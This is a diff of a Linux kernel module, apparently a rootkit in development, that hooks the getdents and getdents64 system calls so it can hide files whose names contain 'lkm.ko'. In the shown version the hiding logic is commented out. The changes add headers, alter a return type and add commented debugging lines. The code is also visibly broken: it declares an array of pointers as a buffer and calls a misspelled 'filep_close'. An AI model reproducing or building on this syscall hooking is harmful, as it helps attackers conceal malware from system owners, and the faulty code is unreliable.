@@ -13,9 +13,9 @@
 #include <linux/dirent.h>
 #include <linux/fs.h>
 #include <linux/sched.h>
-//#include <linux/namei.h>
-//#include <linux/path.h>
-//#include <linux/fs_struct.h>
+#include <linux/fdtable.h>
+#include <linux/path.h>
+#include <linux/fs_struct.h>
 
 MODULE_LICENSE("GPL");
 #ifdef __i386__
@@ -94,11 +94,12 @@ struct linux_dirent {
 };
 
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-    char buf[count];
-    int bpos,nread;
+    char *buf[count];
+    int /*bpos,*/nread;
+    //struct file *fileh;
     //struct linux_dirent *d,*nd;
     //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
     nread = (*original_getdents)(fd,dirp,count); //call the original function to get struct to manipulate
@@ -116,12 +117,16 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
         bpos += d->d_reclen; //next
     }*/
     //copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace;
+    //kfree(buf);
+    //fileh=filp_open(nd->d_name,0,0);
+    //printk("%d\n",test->f_path.dentry->d_inode->i_gid);
+    //filep_close(fileh);
     return nread; //and return so the user process can use the getdents
 }
 
 asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
-    char buf[count];
-    int bpos,nread;
+    char *buf[count];
+    int /*bpos,*/nread;
     //struct linux_dirent64 *d,*nd;
     //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
     nread = (*original_getdents64)(fd,dirp,count); //call the original function to get struct to manipulate
@@ -139,6 +144,7 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
         bpos += d->d_reclen; //next
     }*/
     //copy_to_user(dirp,(struct linux_dirent64 *)buf,sizeof(buf)); //now put it back to userspace
+    //kfree(buf);
     return nread; //and return so the user process can use the getdents
 }
 
